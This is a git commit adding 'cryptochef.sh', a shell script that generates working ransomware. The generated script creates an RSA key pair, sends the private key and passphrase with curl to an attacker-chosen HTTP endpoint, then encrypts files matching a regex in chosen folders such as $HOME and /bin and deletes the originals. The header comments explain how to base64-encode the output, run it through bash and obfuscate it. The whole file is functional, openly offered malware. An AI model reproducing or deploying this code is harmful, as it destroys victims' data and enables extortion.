4855cbfc741bbe4896edafc245a78c24138d4499
killerbyte <killerbyte@protonmail.com>
2018-10-10 11:29:27 +0200

    Add cryptochef script

---
+++ cryptochef.sh
@@ -0,0 +1,37 @@
+#!/bin/bash
+# Generation example: ./script.sh "(.*?)\.(txt|conf)" "\$HOME /bin" 4096 http://127.0.0.1:8000 > scriptt.sh
+# To encode: encoded=$(cat scriptt.sh | base64| tr -d '\n' )
+# To execute the encoded base64:  base64 -d <<< ${encoded} | bash
+# To obfuscate: https://stackoverflow.com/questions/3683910/executing-shell-command-in-background-from-script#answer-29681504
+
+echo "#!/bin/bash
+
+# Declares the files filter
+files_filter=\"$1\"
+# Declares the folders fitler
+folders_filter=($2)
+# Declares the RSA private key length(in bit)
+n_bit_key_length=$3
+# Declares the REMOTE HTTP ENDPOINT
+http_endpoint=$4
+
+# Generates the random private KEY passphare
+private_key_passphrase=\$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 64 | head -n 1)
+
+# Generates the private RSA KEY
+openssl genrsa -aes256 -out \"/tmp/${USER}@${HOSTNAME}_pvt.pem\" -passout pass:\${private_key_passphrase} \${n_bit_key_length}
+
+# Generates the public RSA KEY
+openssl rsa -in \"/tmp/${USER}@${HOSTNAME}_pvt.pem\" -pubout -out /tmp/public.pem -passin pass:\${private_key_passphrase}
+
+# Sends the private_key to the server
+curl -F 'certificate=@/tmp/${USER}@${HOSTNAME}_pvt.pem' -F 'passphrase=\${private_key_passphrase}' \${http_endpoint}
+
+# Removes the private RSA KEY
+rm -f \"/tmp/${USER}@${HOSTNAME}_pvt.pem\"
+
+
+#Apply the filter and encrypt the files
+filter_result=\$(find \${folders_filter[*]} -regextype posix-extended -regex \$files_filter 2>/dev/null)
+for file in \$filter_result; do openssl rsautl -in \"\$file\" -out \"\$file.enc\" -pubin -inkey /tmp/public.pem -encrypt; rm \$file; done
+"
